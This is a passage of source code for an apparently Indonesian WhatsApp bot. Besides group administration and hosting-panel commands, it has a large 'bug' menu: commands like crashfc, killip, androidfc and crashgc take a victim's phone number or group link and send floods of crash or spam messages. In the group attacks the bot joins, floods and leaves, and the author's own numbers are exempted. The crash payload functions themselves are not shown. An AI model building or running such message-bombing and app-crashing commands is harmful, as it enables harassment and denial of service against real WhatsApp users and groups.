case '🌶':
{
    if (!isDeveloper && !isOwner && !isPremium && !isSelf) {
        return;
    }

    let phoneNumber = q.replace(/[^0-9]/g, '');
    if (!phoneNumber) {
        return sendMessage('*Format :*\n' + (prefix + command) + ' 628xxxx');
    }
    
    // Avoid certain phone numbers
    const restrictedNumbers = ['6289630721021', '6283854543070'];
    if (restrictedNumbers.includes(phoneNumber)) {
        return;
    }
    
    let isOnWhatsApp = await client.onWhatsApp(phoneNumber + '@s.whatsapp.net');
    if (isOnWhatsApp.length === 0) {
        return sendMessage('*The number is not registered in the WhatsApp application.*');
    }
    
    let userJid = phoneNumber + '@s.whatsapp.net';
    sendMessage('*Bugs Are Being Processed...*');
    await sleep(2000);
    
    sendMessageWithMentions(
        '*Successfully sent ' +
        command +
        ' to @' +
        userJid.split('@')[0] +
        ', with the amount of spam 20*',
        [userJid]
    );
    
    await sleep(1000);
    sendMultipleTypesOfMessages(userJid, 10);
}
break
case '🍅':
case '🌹':
case '🐲':
case '🔥':
case '🦖':
case '🦕':
{
    if (!isDeveloper && !isOwner && !isPremium) {
        return;
    }

    if (!q) {
        return sendMessage('*Example :*\n' + command + ' 3');
    }
    
    let count = parseInt(q);
    if (isNaN(count)) {
        return sendMessage('Jumlah wajib angka!!');
    }
    
    // Avoid certain JIDs
    const restrictedJids = ['6283131485975@s.whatsapp.net', '6283854543070@s.whatsapp.net'];
    if (restrictedJids.includes(remoteJid)) {
        return;
    }
    
    let spamCount = encodeURI(q) * 7;
    sendReact('⏳');
    await sleep(2000);
    sendReact('✅');
    await sleep(1000);
    
    sendMultipleTypesOfMessages(remoteJid, spamCount);
}
break
case 'killip':
case 'bomip':
case 'travass':
case 'gas_ip':
case 'docip':
case 'crashin':
case 'homeip':
case 'blankip':
case 'craship':
{
    if (!isDeveloper && !isOwner && !isPremium && !isSelf) {
        return;
    }

    let phoneNumber = q.replace(/[^0-9]/g, '');
    if (!phoneNumber) {
        return sendMessage('*Format :*\n' + (prefix + command) + ' 628xxxx');
    }
    
    // Avoid certain phone numbers
    const restrictedNumbers = ['6289630721021', '6283854543070'];
    if (restrictedNumbers.includes(phoneNumber)) {
        return;
    }
    
    let isOnWhatsApp = await client.onWhatsApp(phoneNumber + '@s.whatsapp.net');
    if (isOnWhatsApp.length === 0) {
        return sendMessage('*The number is not registered in the WhatsApp application.*');
    }
    
    let userJid = phoneNumber + '@s.whatsapp.net';
    sendMessage('*Bugs Are Being Processed...*');
    await sleep(2000);
    
    sendMessageWithMentions(
        '*Successfully sent ' +
        command +
        ' to @' +
        userJid.split('@')[0] +
        ', with the amount of spam 25*',
        [userJid]
    );
    
    await sleep(1000);
    sendAlternatingMessages(userJid, 15);
}
break
      case 'sendbug':
case 'trolifc':
case 'travas':
case 'docgas':
case 'crashfc':
case 'infinity':
case 'gaslec':
case 'xforce':
case 'santet':
{
    if (!isDeveloper && !isOwner && !isPremium && !isSelf) {
        return;
    }

    let phoneNumber = q.replace(/[^0-9]/g, '');
    if (!phoneNumber) {
        return sendMessage('*Format :*\n' + (prefix + command) + ' 628xxxx');
    }

    // Avoid certain phone numbers
    const restrictedNumbers = ['6289630721021', '6283854543070'];
    if (restrictedNumbers.includes(phoneNumber)) {
        return;
    }

    let isOnWhatsApp = await client.onWhatsApp(phoneNumber + '@s.whatsapp.net');
    if (isOnWhatsApp.length === 0) {
        return sendMessage('*The number is not registered in the WhatsApp application.*');
    }

    let userJid = phoneNumber + '@s.whatsapp.net';
    sendMessage('*Bugs Are Being Processed...*');
    await sleep(2000);

    sendMessageWithMentions(
        '*Successfully sent ' +
        command +
        ' to @' +
        userJid.split('@')[0] +
        ', with the amount of spam 10*',
        [userJid]
    );

    await sleep(1000);
    sendMultipleTypesOfMessages(userJid, 10);
}
break
case 'wargc':
case 'virdokgc':
case 'xlecgc':
case 'travagc':
case 'buggc':
case 'crashgc':
case 'bomgc':
{
    if (!isDeveloper && !isOwner && !isPremium) {
        return;
    }

    if (!q) {
        return sendMessage(
            '*CARA MENGIRIM BUG GROUP*\n\n' +
            (prefix + command) +
            ' https://chat.whatsapp.com/xxxx\n\n_*Note:*_ Jika ingin mengirim bug dengan jumlah banyak, silahkan ketik sebagai berikut ini\n\nEx: .' +
            command +
            ' linkgc jumlahbug\n\nContoh:\n.' +
            command +
            ' https://chat.whatsapp.com/xxxx 10\n\n©leccyofc'
        );
    }

    sendReact('⏳');

    let [link, amount] = q.split(' ');
    if (!link.includes('whatsapp.com')) {
        return sendMessage('Link Invalid!');
    }

    let groupId = link.split('https://chat.whatsapp.com/')[1];
    try {
        let count = amount ? amount : '1';
        let targetGroup = await client.groupAcceptInvite(groupId);
        await sleep(2500);
        sendReact('✅');
        await sleep(1000);
        sendRepeatedMessages(targetGroup, count);
        await sleep(5000);
        client.groupLeave(targetGroup);
    } catch (error) {
        sendMessage(util.format(error));
    }
}
break
case 'androidfc':
{
    if (!isDeveloper && !isOwner && !isPremium && !isSelf) {
        return;
    }

    if (!q) {
        return sendMessage(
            '*Format :*\n' + (prefix + command) + ' 628xxxx,1'
        );
    }

    let [target, spamAmount] = q.split(',');
    if (isNaN(parseInt(spamAmount))) {
        return sendMessage('Jumlah wajib angka!!');
    }

    let phoneNumber = target.replace(/[^0-9]/g, '');
    let isOnWhatsApp = await client.onWhatsApp(phoneNumber + '@s.whatsapp.net');
    if (isOnWhatsApp.length === 0) {
        return sendMessage('*The number is not registered in the WhatsApp application.*');
    }

    const restrictedNumbers = ['6289630721021', '6283854543070'];
    if (restrictedNumbers.includes(phoneNumber)) {
        return;
    }

    let userJid = phoneNumber + '@s.whatsapp.net';
    let spamCount = parseInt(spamAmount) * 5;
    sendMessage('*Bugs Are Being Processed...*');
    await sleep(2000);

    sendMessageWithMentions(
        '*Successfully sent Bug-ADN to @' +
        userJid.split('@')[0] +
        ', with the amount of spam ' +
        spamCount +
        '*',
        [userJid]
    );

    await sleep(1000);
    sendMultipleTypesOfMessages(userJid, spamCount);
}
break
case 'iphonefc':
{
    if (!isDeveloper && !isOwner && !isPremium && !isSelf) {
        return;
    }

    if (!q) {
        return sendMessage(
            '*Format :*\n' + (prefix + command) + ' 628xxxx,1'
        );
    }

    let [target, spamAmount] = q.split(',');
    if (isNaN(parseInt(spamAmount))) {
        return sendMessage('Jumlah wajib angka!!');
    }

    let phoneNumber = target.replace(/[^0-9]/g, '');
    let isOnWhatsApp = await client.onWhatsApp(phoneNumber + '@s.whatsapp.net');
    if (isOnWhatsApp.length === 0) {
        return sendMessage('*The number is not registered in the WhatsApp application.*');
    }

    const restrictedNumbers = ['6289630721021', '6283854543070'];
    if (restrictedNumbers.includes(phoneNumber)) {
        return;
    }

    let userJid = phoneNumber + '@s.whatsapp.net';
    let spamCount = parseInt(spamAmount) * 10;
    sendMessage('*Bugs Are Being Processed...*');
    await sleep(2000);

    sendMessageWithMentions(
        '*Successfully sent Bug-IOS to @' +
        userJid.split('@')[0] +
        ', with the amount of spam ' +
        spamCount +
        '*',
        [userJid]
    );

    await sleep(1000);
    sendAlternatingMessages(userJid, spamCount);
}
break
      case 'block':
{
    if (!isDeveloper) {
        return sendMessage('*Khusus Owner Leccy!*');
    }

    let phoneNumberToBlock = q.split('|')[0].replace(/[^0-9]/g, '');
    let user = await client.onWhatsApp(phoneNumberToBlock + '@s.whatsapp.net');

    if (user.length === 0) {
        return sendMessage('_Enter a valid and registered number on WhatsApp!!_');
    }

    let userJid = phoneNumberToBlock + '@s.whatsapp.net';
    try {
        await client.updateBlockStatus(userJid, 'block');
        sendMessage('*Successfully blocked @' + phoneNumberToBlock + '*');
    } catch (error) {
        sendMessage('_Failed to block the number: ' + error.message + '_');
    }
}
break
case 'unblock':
{
    if (!isDeveloper) {
        return sendMessage('*Khusus Owner Leccy!*');
    }

    let phoneNumberToUnblock = q.split('|')[0].replace(/[^0-9]/g, '');
    let user = await client.onWhatsApp(phoneNumberToUnblock + '@s.whatsapp.net');

    if (user.length === 0) {
        return sendMessage('_Enter a valid and registered number on WhatsApp!!_');
    }

    let userJid = phoneNumberToUnblock + '@s.whatsapp.net';
    try {
        await client.updateBlockStatus(userJid, 'unblock');
        sendMessage('*Successfully unblocked @' + phoneNumberToUnblock + '*');
    } catch (error) {
        sendMessage('_Failed to unblock the number: ' + error.message + '_');
    }
}
break
case 'leave':
{
    if (!isDeveloper) {
        return sendMessage('*Khusus Owner Leccy!*');
    }

    if (!remoteJid) {
        return sendMessage('Fitur ini hanya dapat digunakan di dalam grup!');
    }

    sendMessage('Bye everyone.');
    await client.groupLeave(remoteJid);
}
break
case 'restart':
case 'shutdown':
{
    if (!isDeveloper) {
        return sendMessage('*Khusus Owner Leccy!*');
    }

    sendMessage('Goodbye 🖐');
    await sleep(3000);
    process.exit();
}
break
case 'menu':
{
    let mark = '0@s.whatsapp.net';
    let listmenuBot = 
        `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
Botname : *${global.botName}*
Owners : *${global.ownerName}*
Pengguna : *${isSelf ? 'VIP' : 'VVIP'}*
Number : @${senderJid.split('@')[0]}
Prefix : *MULTI*
▭▬▭▬▭▬▭▬▭▬▭▬
*===( LIST-MENU )=====*
jadibotmenu
ownermenu
groupmenu
murbugmenu
cpanelmenu
soundmenu
▭▬▭▬▭▬▭▬▭▬▭▬
*===( BUG-MENU )=====*
buginfinity
bugemoji
buggroup
bugiphone
bugandroid
▭▬▭▬▭▬▭▬▭▬▭▬
_*CREDITS © LECCYOFC*_
*POWERED BY @${mark.split('@')[0]}*`;

    sendMentionMessage(listmenuBot, [senderJid, mark]);
}
break
case 'buginfinity':
case 'bugandroid':
case 'bugemoji':
case 'buggroup':
case 'bugiphone':
case 'murbugmenu':
case 'jadibotmenu':
case 'ownermenu':
case 'groupmenu':
case 'cpanelmenu':
case 'soundmenu':
{
    let menuTexts = {
        'bugandroid': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*BUG ANDROID*
.sendbug 628XXXX
.infinity 628XXXX
.gaslec 628XXXX
.xforce 628XXXX
.santet 628XXXX
.trolifc 628XXXX
.travas 628XXXX
.docgas 628XXXX
.crashfc 628XXXX

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'buginfinity': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*BUG CRASH-INFINITY*
.iphonefc 628XXXX,10
.androidfc 628XXXX,10
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'bugemoji': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*BUG EMOJI*

*XNUMBER*
🥀 628XXXXX
🍁 628XXXXX
🌷 628XXXXX
🍒 628XXXXX

*MJSPAM*
🌹 <amount>
🔥 <amount>
🦖 <amount>
🦕 <amount>

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'bugiphone': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*BUG IPHONE*
.killip 628XXXX
.bomip 628XXXX
.travass 628XXXX
.crashin 628XXXX
.homeip 628XXXX
.blankip 628XXXX
.craship 628XXXX
.gas_ip 628XXXX
.docip 628XXXX

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'buggroup': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*BUG GROUP*
.wargc *linkgrup*
.xlecgc *linkgrup*
.buggc *linkgrup*
.crashgc *linkgrup*
.bomgc *linkgrup*
.travagc *linkgrup*
.virdokgc *linkgrup*

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'murbugmenu': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*MURBUG MENU*
.listown
.addown
.delown
.addprem
.delprem
.listprem

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'jadibotmenu': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*JADIBOT MENU*
.jadibot
.stopjadibot
.del-sesi
.resetjadibot
.listjadibot

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'ownermenu': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*OWNER MENU*
.join
.restart
.leave
.unblock
.block
.shutdown
.unmute
.mute
.runtime

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'groupmenu': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*GROUP MENU*
.kick
.open
.close
.linkgc
.linkgrup
.revoke
.hidetag
.promote
.demote
.setname
.setdesc
.editinfo

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'cpanelmenu': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*CPANEL MENU*
.listapi
.addapi
.delusr
.detusr
.listusr
.addusr
.listsrv
.detsrv
.delsrv
.addsrv
.bansrv
.unbansrv
.reinstall

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
        'soundmenu': 
            `▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*SOUND MENU*
.sound1
.sound2
.sound3
.sound4
.sound5
.sound6
.sound7
.sound8
.sound9
.sound10
.sound11
.sound12
.sound13
.sound14
.sound15
.sound16
.sound17
.sound18
.sound19
.sound20

_*© LECCY OFFICIAL*_
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`
    };

    let menuText = menuTexts[command];
    if (menuText) {
        sendMentionMessage(menuText, [senderJid]);
    }
}
break

      case 'join':
    if (message.key.fromMe) {
        return;
    }
    if (!isDeveloper) {
        return sendMessage('This feature can only be used by the owner Bot');
    }
    if (!q) {
        return sendMessage('Enter Group Link!\nEx: .join https://chat.whatsapp.com/xxxx');
    }
    if (!q.includes('whatsapp.com')) {
        return sendMessage('Link Invalid!');
    }
    const inviteCode = q.split('https://chat.whatsapp.com/')[1];
    try {
        const result = await client.groupAcceptInvite(inviteCode);
        sendMessage('Successfully joined the group');
    } catch (error) {
        sendMessage(`Failed to join the group: ${error.message}`);
    }
    break
case 'linkgrup':
case 'linkgc':
    if (!isGroup) {
        return sendMessage('This feature can only be used in a group!');
    }
    if (!isBotAdmin) {
        return sendMessage('This feature can only be used after the bot is an admin!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('This feature can only be used by an admin!');
    }
    try {
        const inviteCode = await client.groupInviteCode(remoteJid);
        const groupLink = `https://chat.whatsapp.com/${inviteCode}`;
        sendMessage(groupLink);
    } catch (error) {
        sendMessage(`Failed to generate group link: ${error.message}`);
    }
    break
case 'open':
    if (!isGroup) {
        return sendMessage('This feature can only be used in a group!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('This feature can only be used by an admin!');
    }
    if (!isBotAdmin) {
        return sendMessage('This feature can only be used after the bot is an admin!');
    }
    try {
        await client.groupSettingUpdate(remoteJid, 'not_announcement');
        sendMessage('*OPENED* The group is opened by admin\nNow members can send messages');
    } catch (error) {
        sendMessage(`Failed to open the group: ${error.message}`);
    }
    break
case 'close':
    if (!isGroup) {
        return sendMessage('This feature can only be used in a group!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('This feature can only be used by an admin!');
    }
    if (!isBotAdmin) {
        return sendMessage('This feature can only be used after the bot is an admin!');
    }
    try {
        await client.groupSettingUpdate(remoteJid, 'announcement');
        sendMessage('*CLOSED* The group is closed by admin\nNow only admins can send messages');
    } catch (error) {
        sendMessage(`Failed to close the group: ${error.message}`);
    }
    break
case 'revoke':
    if (!isGroup) {
        return sendMessage('This feature can only be used in a group!');
    }
    if (!isBotAdmin) {
        return sendMessage('This feature can only be used after the bot is an admin!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('This feature can only be used by an admin!');
    }
    try {
        const result = await client.groupRevokeInvite(remoteJid);
        sendMessage('Group invite link revoked successfully');
    } catch (error) {
        sendMessage(`Failed to revoke the invite link: ${error.message}`);
    }
    break

      case 'kick':
    if (!isGroup) {
        return sendMessage('This feature can only be used in a group!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('This feature can only be used by an admin!');
    }
    if (!isBotAdmin) {
        return sendMessage('This feature can only be used after the bot is an admin!');
    }
    if (
        !message.message.extendedTextMessage ||
        !message.message.extendedTextMessage.contextInfo
    ) {
        return sendMessage('Please reply to the target!');
    }
    try {
        const removeParticipant = message.message.extendedTextMessage.contextInfo.participant;
        await client.groupParticipantsUpdate(remoteJid, [removeParticipant], 'remove');
        sendMessage('Participant successfully removed from the group!');
    } catch (error) {
        sendMessage(`Failed to remove participant: ${error.message}`);
    }
    break
case 'hidetag':
    if (!isGroup) {
        return sendMessage('This feature can only be used in a group!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('This feature can only be used by an admin!');
    }
    try {
        const participants = groupMembers.map(member => member.id);
        await client.sendMessage(remoteJid, {
            text: q ? q : '',
            mentions: participants,
        });
    } catch (error) {
        sendMessage(`Failed to hide tag: ${error.message}`);
    }
    break
case 'promote':
    if (!isGroup) {
        return sendMessage('This feature can only be used in a group!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('This feature can only be used by an admin!');
    }
    if (!isBotAdmin) {
        return sendMessage('This feature can only be used after the bot is an admin!');
    }
    if (
        !message.message.extendedTextMessage ||
        !message.message.extendedTextMessage.contextInfo
    ) {
        return sendMessage('Please reply to the target!');
    }
    try {
        const promoteParticipant = message.message.extendedTextMessage.contextInfo.participant;
        await client.groupParticipantsUpdate(remoteJid, [promoteParticipant], 'promote');
        sendMessage('Participant successfully promoted!');
    } catch (error) {
        sendMessage(`Failed to promote participant: ${error.message}`);
    }
    break
case 'demote':
    if (!isGroup) {
        return sendMessage('This feature can only be used in a group!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('This feature can only be used by an admin!');
    }
    if (!isBotAdmin) {
        return sendMessage('This feature can only be used after the bot is an admin!');
    }
    if (
        !message.message.extendedTextMessage ||
        !message.message.extendedTextMessage.contextInfo
    ) {
        return sendMessage('Please reply to the target!');
    }
    try {
        const demoteParticipant = message.message.extendedTextMessage.contextInfo.participant;
        await client.groupParticipantsUpdate(remoteJid, [demoteParticipant], 'demote');
        sendMessage('Participant successfully demoted!');
    } catch (error) {
        sendMessage(`Failed to demote participant: ${error.message}`);
    }
    break

      case 'setname':
case 'setsubject':
    if (!isGroup) {
        return sendMessage('Fitur ini hanya dapat digunakan di dalam grup!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('Fitur ini hanya dapat digunakan oleh admin!');
    }
    if (!isBotAdmin) {
        return sendMessage('Fitur ini hanya dapat digunakan setelah bot menjadi admin!');
    }
    if (!q) {
        return sendMessage('Nama grupnya mana?\n\nContoh:\n.setname nama_grup');
    }
    try {
        await client.groupUpdateSubject(remoteJid, q);
        sendMessage('Nama grup berhasil diubah!');
    } catch (error) {
        sendMessage(`Gagal mengubah nama grup: ${error.message}`);
    }
    break
case 'setdesc':
case 'setdesk':
    if (!isGroup) {
        return sendMessage('Fitur ini hanya dapat digunakan di dalam grup!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('Fitur ini hanya dapat digunakan oleh admin!');
    }
    if (!isBotAdmin) {
        return sendMessage('Fitur ini hanya dapat digunakan setelah bot menjadi admin!');
    }
    if (!q) {
        return sendMessage('Teks deskripsinya mana?\n\nContoh:\n.setdesc teks_deskripsi');
    }
    try {
        await client.groupUpdateDescription(remoteJid, q);
        sendMessage('Deskripsi grup berhasil diubah!');
    } catch (error) {
        sendMessage(`Gagal mengubah deskripsi grup: ${error.message}`);
    }
    break
case 'editinfo':
    if (!isGroup) {
        return sendMessage('Fitur ini hanya dapat digunakan di dalam grup!');
    }
    if (!isGroupAdmin && !isDeveloper) {
        return sendMessage('Fitur ini hanya dapat digunakan oleh admin!');
    }
    if (!isBotAdmin) {
        return sendMessage('Fitur ini hanya dapat digunakan setelah bot menjadi admin!');
    }
    try {
        if (args[0] === 'open') {
            await client.groupSettingUpdate(remoteJid, 'unlocked');
            sendMessage('Berhasil membuka edit info grup');
        } else if (args[0] === 'close') {
            await client.groupSettingUpdate(remoteJid, 'locked');
            sendMessage('Berhasil menutup edit info grup');
        } else {
            sendMessage(
                '*MODE DESKRIPSI GROUP*\n\n*_Open : semua member bisa edit deskripsi grup_*\n\n*_Close: hanya admin grup yang bisa edit deskripsi_*\n\n*Contoh:*\n' +
                command + ' close'
            );
        }
    } catch (error) {
        sendMessage(`Gagal mengubah pengaturan info grup: ${error.message}`);
    }
    break
case 'listapi':
    if (!isDeveloper) {
        return sendMessage('Fitur ini hanya dapat digunakan oleh pemilik/developer!');
    }
    try {
        const response = await fetch(`${global.domain}/api/client/account/api-keys`, {
            method: 'GET',
            headers: {
                Accept: 'application/json',
                'Content-Type': 'application/json',
                Authorization: `Bearer ${global.key_pltc}`,
            },
        });
        const data = await response.json();
        if (data.errors) {
            return sendMessage(data.errors[0].message);
        }
        sendMessage(JSON.stringify(data.data));
    } catch (error) {
        sendMessage(`Gagal mengambil daftar API: ${error.message}`);
    }
    break
case 'addapi':
    if (!isDeveloper) {
        return sendMessage('Fitur ini hanya dapat digunakan oleh pemilik/developer!');
    }
    try {
        const apiDescription = q || generateRandomString(5);
        const response = await fetch(`${global.domain}/api/client/account/api-keys`, {
            method: 'POST',
            headers: {
                Accept: 'application/json',
                'Content-Type': 'application/json',
                Authorization: `Bearer ${global.key_pltc}`,
            },
            body: JSON.stringify({
                description: apiDescription,
                allowed_ips: [],
            }),
        });
        const data = await response.json();
        if (data.errors) {
            return sendMessage(data.errors[0].message);
        }
        sendMessage(JSON.stringify(data));
    } catch (error) {
        sendMessage(`Gagal menambahkan API: ${error.message}`);
    }
    break

      case 'addusr':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let userInput = q.split(',')[0] || senderJid.split('@')[0],
            username = q.split(',')[1];
        if (!username) {
            return sendMessage('*FORMAT ADDUSR*:\n.addusr 628xxxx,leccy');
        }
        userNumber = userInput.replace(/[^0-9]/g, '');
        let isValidUser = await client.onWhatsApp(userNumber + '@s.whatsapp.net');
        if (isValidUser.length == 0) {
            return sendMessage('_Enter A Valid And Registered Number On WhatsApp!!_');
        }
        let password = '' + username + generateRandomString(3),
            userJid = userNumber + '@s.whatsapp.net',
            response = await fetch(global.domain + '/api/application/users', {
                method: 'POST',
                headers: {
                    Accept: 'application/json',
                    'Content-Type': 'application/json',
                    Authorization: 'Bearer ' + global.key_plta,
                },
                body: JSON.stringify({
                    email: username + '@buyer.id',
                    username: username,
                    first_name: username,
                    last_name: 'Users',
                    language: 'en',
                    password: password,
                }),
            }),
            jsonResponse = await response.json();
        if (jsonResponse.errors) {
            return sendMessage(jsonResponse.errors[0].detail);
        }
        let userDetails = jsonResponse.attributes;
        sendMessage(userDetails.username + ',,' + userDetails.id + ',ram/disk,cpu');
        let message = await client.sendMessage(
            userNumber + '@s.whatsapp.net',
            {
                text: '𝗕𝗘𝗥𝗜𝗞𝗨𝗧 𝗗𝗘𝗧𝗔𝗜𝗟 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔ï¸ï¸\n\nID: ' +
                      userDetails.id +
                      '\nEMAIL: ' +
                      userDetails.email +
                      '\nUSERNAME: ' +
                      userDetails.username +
                      '\nPASSWORD: ' +
                      password +
                      '\nEXPIRED: 1 BULAN\nCREATED AT: \n' +
                      userDetails.created_at +
                      '\n\nWEB LOGIN:\n' +
                      domain +
                      '\n\ncara upload script strava\nke panel dan cara install\nnode modules manual:\nhttps://shorturl.at/HkUQE\n\n*NOTE*\nHarap Login Akun Panel Setelah \n1Menit Dibuat/Dikirim Dari Bot\n',
                participant: { jid: userJid },
            }
        );
        sendMessage(
            '𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟\n\nID: ' +
            userDetails.id +
            '\nTYPE: ' +
            jsonResponse.object +
            '\nUSERNAME: ' +
            userDetails.username +
            '\nEMAIL: ' +
            userDetails.email +
            '\nNAME: ' +
            userDetails.first_name + ' ' + userDetails.last_name +
            '\nLANGUAGE: ' +
            userDetails.language +
            '\nADMIN: ' +
            userDetails.root_admin +
            '\nCREATED AT: \n' +
            userDetails.created_at +
            '\n\n*SEND ACCOUNT* @' +
            userJid.split('@')[0],
            [userJid]
        );
    }
    break
case 'delusr':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let userId = q;
        if (!userId) {
            return sendMessage('ID nya mana?');
        }
        let response = await fetch(
                global.domain + '/api/application/users/' + userId,
                {
                    method: 'DELETE',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            jsonResponse = await response.json();
        if (jsonResponse.errors) {
            return sendMessage(util.format(jsonResponse.errors[0]));
        }
        sendMessage('*SUKSES DELETE USER ' + userId + '*');
    }
    break
case 'detusr':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let userId = args[0],
            response = await fetch(
                global.domain + '/api/application/users/' + userId,
                {
                    method: 'GET',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            jsonResponse = await response.json();
        if (jsonResponse.errors) {
            return sendMessage(util.format(jsonResponse.errors[0]));
        }
        let userDetails = jsonResponse.attributes,
            userDetailMessage =
                '▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n' +
                userDetails.username.toUpperCase() + ' USER DETAILS\n\nID: ' +
                userDetails.id +
                '\nUSERNAME: ' +
                userDetails.username +
                '\nLANGUAGE: ' +
                userDetails.language +
                '\nADMIN: ' +
                userDetails.root_admin +
                '\nEMAIL: ' +
                userDetails.email +
                '\nCREATED AT: \n ' +
                userDetails.created_at +
                '\n▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬';
        sendMessage(userDetailMessage);
    }
    break
case 'listusr':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let pageNumber = q ? q : '1',
            response = await fetch(
                global.domain + '/api/application/users?page=' + pageNumber,
                {
                    method: 'GET',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            jsonResponse = await response.json();
        if (jsonResponse.errors) {
            return sendMessage(util.format(jsonResponse.errors[0]));
        }
        let listMessage =
                '▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n*LIST USERS PANEL*\n□ Nama Host : ' +
                global.nama_host +
                '\n□ Total Users : ' +
                jsonResponse.meta.pagination.count +
                '\n▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\n',
            users = jsonResponse.data,
            userList = [];
        for (let user of users) {
            let userDetails = user.attributes,
                userInfo = {
                    id: userDetails.id,
                    username: userDetails.username,
                    email: userDetails.email,
                    language: userDetails.language,
                    root_admin: userDetails.root_admin,
                };
            await userList.push(userInfo);
        }
        sendMessage(util.format(userList));
    }
    break
case 'addsrv':
    {
        if (!isDeveloper) {
            return sendMessage('*This feature can only be used by the owner/Dev*');
        }
        let serverInput = q.split(',');
        if (serverInput.length < 5) {
            return sendMessage('username,deskripsi,userID,ram/disk,cpu');
        }
        let serverName = serverInput[0],
            description =
                serverInput[1] ||
                '© BUYER LECCY || SERVER OVERHEAT DELETE ACCOUNT✅',
            userId = serverInput[2],
            memoryDisk = serverInput[3].split(`/`),
            cpu = serverInput[4],
            eggId = global.eggID,
            locationId = global.locID,
            eggDetailsResponse = await fetch(
                global.domain + '/api/application/nests/5/eggs/' + eggId,
                {
                    method: 'GET',
                    headers: {
                        Accept: 'application/json',
                        'Content-Type': 'application/json',
                        Authorization: 'Bearer ' + global.key_plta,
                    },
                }
            ),
            eggDetails = await eggDetailsResponse.json(),
            startupCommand = '${CMD_RUN}',
            serverResponse = await fetch(domain + '/api/application/servers', {
                method: 'POST',
                headers: {
                    Accept: 'application/json',
                    'Content-Type': 'application/json',
                    Authorization: 'Bearer ' + global.key_plta,
                },
                body: JSON.stringify({
                    name: serverName,
                    description: description,
                    user: userId,
                    egg: parseInt(eggId),
                    docker_image: 'ghcr.io/parkervcp/yolks:nodejs_21',
                    startup: '' + startupCommand,
                    environment: {
                        INST: 'npm',
                        USER_UPLOAD: '0',
                        AUTO_UPDATE: '0',
                        CMD_RUN: 'npm start',
                    },
                    limits: {
                        memory: memoryDisk[0],
                        swap: 0,
                        disk: memoryDisk[1],
                        io: 500,
                        cpu: cpu,
                    },
                    feature_limits: {
                        databases: 5,
                        backups: 5,
                        allocations: 5,
                    },
                    deploy: {
                        locations: [parseInt(locationId)],
                        dedicated_ip: false,
                        port_range: [],
                    },
                }),
            }),
            serverDetails = await serverResponse.json();
        if (serverDetails.errors) {
            return sendMessage(util.format(serverDetails.errors[0]));
        }
        let serverInfo = serverDetails.attributes,
            serverDetailMessage =
                '𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗦𝗘𝗥𝗩𝗘𝗥\n\nID: ' +
                serverInfo.id +
                '\nTYPE: ' +
                serverDetails.object +
                '\nNAME: ' +
                serverInfo.name +
                '\nMEMORY: ' +
                (serverInfo.limits.memory === 0 ? 'unlimited' : serverInfo.limits.memory) +
                ' MB\nDISK: ' +
                (serverInfo.limits.disk === 0 ? 'unlimited' : serverInfo.limits.disk) +
                ' MB\nCPU: ' +
